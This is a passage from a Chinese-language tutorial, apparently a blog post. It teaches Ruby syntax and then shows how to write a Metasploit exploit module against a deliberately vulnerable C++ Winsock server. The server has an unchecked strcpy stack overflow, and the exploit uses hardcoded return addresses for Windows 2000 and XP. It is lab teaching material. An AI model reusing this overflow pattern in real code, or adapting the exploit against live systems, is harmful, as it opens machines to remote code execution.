+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i &lt; <span class="hljs-number">5</span><br>    puts i<br>    i += <span class="hljs-number">1</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0<br>1<br>2<br>3<br>4<br></code></pre></td></tr></table></figure>
+
+<p><code>each</code>循环</p>
+<p>在 Ruby 中，<code>each</code> 是一种常用的迭代方法，它可以用于遍历数组、哈希等集合类型的元素，并对每个元素执行指定的代码块。<code>each</code> 是一种非常方便的方式来遍历集合。</p>
+<ul>
+<li>例</li>
+</ul>
+<p>对一个数组进行遍历</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>].each <span class="hljs-keyword">do</span> |<span class="hljs-params">num</span>|<br>	puts num<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1<br>2<br>3<br>4<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>例</li>
+</ul>
+<p>同样是对一个数组进行遍历，于上一个例子本质是一样的。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br>arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br><br>arr.each <span class="hljs-keyword">do</span> |<span class="hljs-params">num</span>|<br>  puts num<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1<br>2<br>3<br>4<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>例</li>
+</ul>
+<p>对 hash 表进行遍历</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br>hash = &#123;<span class="hljs-symbol">a:</span> <span class="hljs-number">1</span>, <span class="hljs-symbol">b:</span> <span class="hljs-number">2</span>, <span class="hljs-symbol">c:</span> <span class="hljs-number">3</span>&#125;<br><br>hash.each <span class="hljs-keyword">do</span> |<span class="hljs-params">key, value</span>|<br>  puts <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;key&#125;</span>: <span class="hljs-subst">#&#123;value&#125;</span>&quot;</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a: 1<br>b: 2<br>c: 3<br></code></pre></td></tr></table></figure>
+
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>方法（函数）的定义与 C 语言大致相同，用保留字<code>def</code>和<code>end</code>标识一个函数体。</p>
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">display</span>(<span class="hljs-params">n</span>) <br>	<span class="hljs-keyword">if</span> n==<span class="hljs-number">1</span> <br>	print <span class="hljs-string">&quot;failwest!\n&quot;</span> <br>	<span class="hljs-keyword">else</span> <br>	print <span class="hljs-string">&quot;hello world!\n&quot;</span> <br>	<span class="hljs-keyword">end</span> <br><span class="hljs-keyword">end</span> <br>display(<span class="hljs-number">1</span>) <br>display(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">failwest!<br>hello world!<br></code></pre></td></tr></table></figure>
+
+<h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>模块是用于封装方法和常量的容器，可以用来实现共享的功能，通常用于 Mixin（混入）或命名空间。模块不能被实例化，但可以被包括到类中，给类提供方法或功能。</p>
+<ul>
+<li>例</li>
+</ul>
+<p>定义模块：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br><span class="hljs-keyword">module</span> <span class="hljs-title class_">MyModule</span><br>  <span class="hljs-comment"># 常量定义</span><br>  <span class="hljs-variable constant_">MY_CONSTANT</span> = <span class="hljs-number">42</span><br><br>  <span class="hljs-comment"># 方法定义</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_method</span><br>    puts <span class="hljs-string">&quot;Hello from MyModule!&quot;</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<p>使用模块：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># 通过include将模块的方法包含到类中</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">MyModule</span><br><span class="hljs-keyword">end</span><br><br>obj = <span class="hljs-title class_">MyClass</span>.new<br>obj.my_method  <span class="hljs-comment"># 输出 &quot;Hello from MyModule!&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">hello form MyModule<br></code></pre></td></tr></table></figure>
+
+<h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>类是对象的模板或蓝图，可以通过类定义实例化对象，并定义对象的属性（实例变量）和行为（方法）。</p>
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span><br>  <span class="hljs-comment"># 类的属性</span><br>  <span class="hljs-built_in">attr_accessor</span> <span class="hljs-symbol">:name</span><br><br>  <span class="hljs-comment"># 构造方法（初始化方法）</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">name</span>)<br>    <span class="hljs-variable">@name</span> = name<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-comment"># 实例方法</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span><br>    puts <span class="hljs-string">&quot;Hello, <span class="hljs-subst">#&#123;<span class="hljs-variable">@name</span>&#125;</span>!&quot;</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<p>使用类：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">obj = <span class="hljs-title class_">MyClass</span>.new(<span class="hljs-string">&quot;Ruby&quot;</span>)<br>obj.greet  <span class="hljs-comment"># 输出 &quot;Hello, Ruby!&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Hello, Ruby!<br></code></pre></td></tr></table></figure>
+
+<p><strong>实例方法</strong></p>
+<p>实例方法是在类中定义的，属于类的实例（对象）。</p>
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">instance_method</span><br>    puts <span class="hljs-string">&quot;This is an instance method&quot;</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br>obj = <span class="hljs-title class_">MyClass</span>.new<br>obj.instance_method <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">This is an instance metho<br></code></pre></td></tr></table></figure>
+
+<p><strong>类方法</strong></p>
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span><br>  <span class="hljs-comment"># 定义类方法</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">self</span>.class_method<br>    puts <span class="hljs-string">&quot;This is a class method&quot;</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-title class_">MyClass</span>.class_method<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">This is a class method<br></code></pre></td></tr></table></figure>
+
+<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>异常处理用于捕获和处理程序执行过程中可能发生的错误，避免程序崩溃并提供错误处理机制。Ruby 提供了 <code>begin</code>、<code>rescue</code>、<code>else</code> 和 <code>ensure</code> 关键字来处理异常。下面是 Ruby 异常处理的基本概念和用法。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">begin</span><br>  <span class="hljs-comment"># 可能会抛出异常的代码</span><br><span class="hljs-keyword">rescue</span> <span class="hljs-title class_">SomeError</span> =&gt; e<br>  <span class="hljs-comment"># 异常处理代码</span><br><span class="hljs-keyword">else</span><br>  <span class="hljs-comment"># 没有异常发生时的代码</span><br><span class="hljs-keyword">ensure</span><br>  <span class="hljs-comment"># 无论是否有异常发生，都会执行的代码</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">begin</span><br>  <span class="hljs-comment"># 可能抛出异常的代码</span><br>  num = <span class="hljs-number">10</span> / <span class="hljs-number">0</span>  <span class="hljs-comment"># 除零错误</span><br><span class="hljs-keyword">rescue</span> <span class="hljs-title class_">ZeroDivisionError</span> =&gt; e<br>  <span class="hljs-comment"># 捕获到除零错误</span><br>  puts <span class="hljs-string">&quot;Error: <span class="hljs-subst">#&#123;e.message&#125;</span>&quot;</span>  <span class="hljs-comment"># 输出错误信息</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Error: divided by 0<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="Exploit-开发"><a href="#Exploit-开发" class="headerlink" title="Exploit 开发"></a>Exploit 开发</h2><p>使用 Ruby 语言开发一个 exploit 模块，并在 MSF 下运行以测试漏洞。</p>
+<h3 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h3><p>漏洞程序是一个简单的典型栈溢出 server，由C++编写。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winsock2.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;ws2_32.lib&quot;</span>) </span><br><br><span class="hljs-comment">// Function to display message</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">msg_display</span><span class="hljs-params">(<span class="hljs-type">char</span> * buf)</span> </span>&#123; <br>    <span class="hljs-type">char</span> msg[<span class="hljs-number">200</span>]; <br>    <span class="hljs-built_in">strcpy</span>(msg, buf); <span class="hljs-comment">// overflow here, copy 0x200 to 200 </span><br>    cout &lt;&lt; <span class="hljs-string">&quot;********************&quot;</span> &lt;&lt; endl; <br>    cout &lt;&lt; <span class="hljs-string">&quot;received:&quot;</span> &lt;&lt; endl; <br>    cout &lt;&lt; msg &lt;&lt; endl; <br>&#125; <br><br><span class="hljs-comment">// Main function</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123; <br>    <span class="hljs-type">int</span> sock, msgsock, lenth, receive_len; <br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> sock_server, sock_client; <br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x200</span>]; <span class="hljs-comment">// buffer size is 0x200 (512 bytes)</span><br>    <br>    WSADATA wsa; <br>    <span class="hljs-comment">// Initialize Winsock</span><br>    <span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>), &amp;wsa); <br>    <br>    <span class="hljs-comment">// Create socket</span><br>    <span class="hljs-keyword">if</span> ((sock = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123; <br>        cout &lt;&lt; sock &lt;&lt; <span class="hljs-string">&quot; socket creating error!&quot;</span> &lt;&lt; endl; <br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); <br>    &#125; <br>    <br>    <span class="hljs-comment">// Set up the server address</span><br>    sock_server.sin_family = AF_INET; <br>    sock_server.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">7777</span>); <span class="hljs-comment">// listening on port 7777</span><br>    sock_server.sin_addr.s_addr = <span class="hljs-built_in">htonl</span>(INADDR_ANY); <br>    <br>    <span class="hljs-comment">// Bind the socket</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bind</span>(sock, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;sock_server, <span class="hljs-built_in">sizeof</span>(sock_server))) &#123; <br>        cout &lt;&lt; <span class="hljs-string">&quot;binding stream socket error!&quot;</span> &lt;&lt; endl; <br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <br>    cout &lt;&lt; <span class="hljs-string">&quot;**************************************&quot;</span> &lt;&lt; endl; <br>    cout &lt;&lt; <span class="hljs-string">&quot;     exploit target server 1.0    &quot;</span> &lt;&lt; endl; <br>    cout &lt;&lt; <span class="hljs-string">&quot;**************************************&quot;</span> &lt;&lt; endl; <br>    <br>    <span class="hljs-comment">// Start listening for connections</span><br>    <span class="hljs-built_in">listen</span>(sock, <span class="hljs-number">4</span>); <br>    lenth = <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr); <br>    <br>    <span class="hljs-comment">// Accept incoming connections</span><br>    <span class="hljs-keyword">do</span> &#123; <br>        msgsock = <span class="hljs-built_in">accept</span>(sock, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;sock_client, (<span class="hljs-type">int</span>*)&amp;lenth); <br>        <span class="hljs-keyword">if</span> (msgsock == <span class="hljs-number">-1</span>) &#123; <br>            cout &lt;&lt; <span class="hljs-string">&quot;accept error!&quot;</span> &lt;&lt; endl; <br>            <span class="hljs-keyword">break</span>; <br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">do</span> &#123; <br>                <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(buf)); <br>                <span class="hljs-comment">// Receive data from client</span><br>                <span class="hljs-keyword">if</span> ((receive_len = <span class="hljs-built_in">recv</span>(msgsock, buf, <span class="hljs-built_in">sizeof</span>(buf), <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123; <br>                    cout &lt;&lt; <span class="hljs-string">&quot;reading stream message error!&quot;</span> &lt;&lt; endl; <br>                    receive_len = <span class="hljs-number">0</span>; <br>                &#125; <br>                <span class="hljs-built_in">msg_display</span>(buf); <span class="hljs-comment">// Triggered overflow </span><br>            &#125; <span class="hljs-keyword">while</span> (receive_len); <br>            <span class="hljs-built_in">closesocket</span>(msgsock); <span class="hljs-comment">// Close the client socket</span><br>        &#125; <br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>); <br>    <br>    <span class="hljs-comment">// Cleanup Winsock</span><br>    <span class="hljs-built_in">WSACleanup</span>(); <br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>这是一个非常简易的 TCP socket程序。编译运行后，程序会在 7777 端口监听 TCP 链接，如果收到数据就在屏幕上打印出来。在 main 函数中，buf 数组的大小被声明为 0x200，在 display 函数中将有可能把 0x200 的字符串复制进 200 大小的局部变量数组，从而触发栈溢出。</p>
+<p>我的实验环境如下：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用的环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>操作系统</td>
+<td>Windows Xp 2.0</td>
+<td>win32</td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>VC6.0</td>
+<td></td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td>默认</td>
+<td></td>
+</tr>
+<tr>
+<td>build</td>
+<td>release版本</td>
+<td>debug版本也可用于实验，但细节会有差异</td>
+</tr>
+</tbody></table>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;msf/core&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Metasploit3</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Exploit::Remote::Tcp</span><br>  <br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(update_info(info,<br>      <span class="hljs-string">&#x27;Name&#x27;</span>         =&gt; <span class="hljs-string">&#x27;failwest_test&#x27;</span>, <br>      <span class="hljs-string">&#x27;Platform&#x27;</span>     =&gt; <span class="hljs-string">&#x27;win&#x27;</span>, <br>      <span class="hljs-string">&#x27;Targets&#x27;</span>      =&gt; [<br>        [<span class="hljs-string">&#x27;Windows 2000&#x27;</span>,  &#123;<span class="hljs-string">&#x27;Ret&#x27;</span> =&gt; <span class="hljs-number">0x77F8948B</span> &#125;],  <br>        [<span class="hljs-string">&#x27;Windows XP SP2&#x27;</span>, &#123;<span class="hljs-string">&#x27;Ret&#x27;</span> =&gt; <span class="hljs-number">0x7C914393</span> &#125;]<br>      ],<br>      <span class="hljs-string">&#x27;Payload&#x27;</span>      =&gt; &#123; <br>        <span class="hljs-string">&#x27;Space&#x27;</span>    =&gt; <span class="hljs-number">200</span>, <br>        <span class="hljs-string">&#x27;BadChars&#x27;</span> =&gt; <span class="hljs-string">&quot;\x00&quot;</span>  <span class="hljs-comment"># null byte is bad char</span><br>      &#125;<br>    ))<br>  <span class="hljs-keyword">end</span> <span class="hljs-comment"># end of initialize</span><br>  <br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    connect<br>    <br>    <span class="hljs-comment"># Create the attack buffer</span><br>    attack_buf = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">200</span> + [target[<span class="hljs-string">&#x27;Ret&#x27;</span>]].pack(<span class="hljs-string">&#x27;V&#x27;</span>) + payload.encoded<br>    <br>    <span class="hljs-comment"># Send the payload to the target</span><br>    sock.put(attack_buf)<br>    <br>    <span class="hljs-comment"># Start the handler and disconnect</span><br>    handler<br>    disconnect<br>  <span class="hljs-keyword">end</span>  <span class="hljs-comment"># end of exploit</span><br>  <br><span class="hljs-keyword">end</span> <span class="hljs-comment"># end of class</span><br></code></pre></td></tr></table></figure>
+
+<p><code>require</code>指明所需的类库，相当于 C 语言的<code>include</code>。所以有 MSF 模块都需要这句话。</p>
+<p>运算符<code>&lt;</code>在这里表示继承，也就是说，我们所定义的类是由<code>Msf::Exploit::Remote</code>继承而来，可以方便地使用父类的资源。</p>
+<p>在类中只定义了两个方法（函数），一个是<code>initialize</code>，另一个是<code>exploit</code>。</p>
+<p>现在的模块架构可以看成：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> xxx <br>	<span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span> <br>	<span class="hljs-comment">#定义模块初始化信息，如漏洞适用的操作系统平台、为不同操作系 </span><br>	<span class="hljs-comment">#统指明不同的返回地址、指明shellcode中禁止出现的特殊字符、 </span><br>	<span class="hljs-comment">#漏洞相关的描述、URL引用、作者信息等 </span><br>	<span class="hljs-keyword">end</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span> <br>	<span class="hljs-comment">#将填充物、返回地址、shellcode等组织成最终的attack_buffer，并 </span><br>	<span class="hljs-comment">#发送 </span><br>	<span class="hljs-keyword">end</span> <br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<p>可见为 MSF 开发模块的过程实际上就是实现这两个方法的过程。下面分别来看看这两个方法。 </p>
+<p><code>initialize</code>方法的实现非常简单，在某种意义上更像是在 “填空”。本节例子中只 “填” 了最基本的信息。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(update_info(info,<br>      <span class="hljs-string">&#x27;Name&#x27;</span>         =&gt; <span class="hljs-string">&#x27;failwest_test&#x27;</span>, <br>      <span class="hljs-string">&#x27;Platform&#x27;</span>     =&gt; <span class="hljs-string">&#x27;win&#x27;</span>, <br>      <span class="hljs-string">&#x27;Targets&#x27;</span>      =&gt; [<br>        [<span class="hljs-string">&#x27;Windows 2000&#x27;</span>,  &#123;<span class="hljs-string">&#x27;Ret&#x27;</span> =&gt; <span class="hljs-number">0x77F8948B</span> &#125;],  <br>        [<span class="hljs-string">&#x27;Windows XP SP2&#x27;</span>, &#123;<span class="hljs-string">&#x27;Ret&#x27;</span> =&gt; <span class="hljs-number">0x7C914393</span> &#125;]<br>      ],<br>      <span class="hljs-string">&#x27;Payload&#x27;</span>      =&gt; &#123; <br>        <span class="hljs-string">&#x27;Space&#x27;</span>    =&gt; <span class="hljs-number">200</span>, <br>        <span class="hljs-string">&#x27;BadChars&#x27;</span> =&gt; <span class="hljs-string">&quot;\x00&quot;</span>  <span class="hljs-comment"># null byte is bad char</span><br>      &#125;<br>    ))<br>  <span class="hljs-keyword">end</span> <span class="hljs-comment"># end of initialize</span><br></code></pre></td></tr></table></figure>
+
+<p>从代码中可以看到，<code>initialize</code>实际上只调用了一个方法<code>update_info</code>来初始化<code>info</code>数据结构。初始化的过程通过一系列<code>hash</code>操作完成。</p>
+<ol>
+<li>Name 模块的名称，MSF 通过这个名称来引用本模块</li>
